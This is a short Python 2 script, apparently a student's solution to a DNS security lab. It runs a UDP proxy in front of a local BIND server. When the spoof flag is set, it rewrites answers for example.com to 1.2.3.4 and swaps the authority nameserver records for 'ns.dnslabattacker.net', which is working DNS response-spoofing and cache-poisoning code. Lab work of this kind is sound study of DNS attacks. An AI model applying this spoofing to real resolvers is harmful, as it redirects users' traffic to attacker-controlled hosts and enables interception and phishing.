#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *
import sys

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
# BIND's host
host = "127.0.0.1"


def start():
    try:
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        proxy_socket.bind((host, port))
        print("[*] Proxy started successfully [ %d ]" % (port))
    except Exception as e:
        # Fail to bind the socket
        print("[*] Proxy failed to start")
        print(e)
        sys.exit(-1)
    
    # Listening to the port
    while True:
        try:
            # Not sure about this part
            handle_requests(proxy_socket=proxy_socket)
        except KeyboardInterrupt:
            sys.exit(1)


def handle_requests(proxy_socket):
    # Receive the requests from dig
    request, request_address = proxy_socket.recvfrom(4096)
    #print("[*] Received requests from: " + str(request_address[0]))
    socket_to_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # Direct the requests to BIND
        socket_to_server.sendto(request, (host, dns_port))
        reply, _ = socket_to_server.recvfrom(4096)
        reply = DNS(reply)
        
        if SPOOF:
            if reply[DNSQR].qname == "example.com.":
                reply[DNSRR].rdata = "1.2.3.4"

                for i in range(reply[DNS].nscount):
                    reply[DNS].ns[DNSRR][i].rdata = "ns.dnslabattacker.net" 

        # Send responses from BIND back to dig
        # print(reply[DNSRR].rdata)
        proxy_socket.sendto(bytes(reply), request_address)
    finally:
        socket_to_server.close()


start()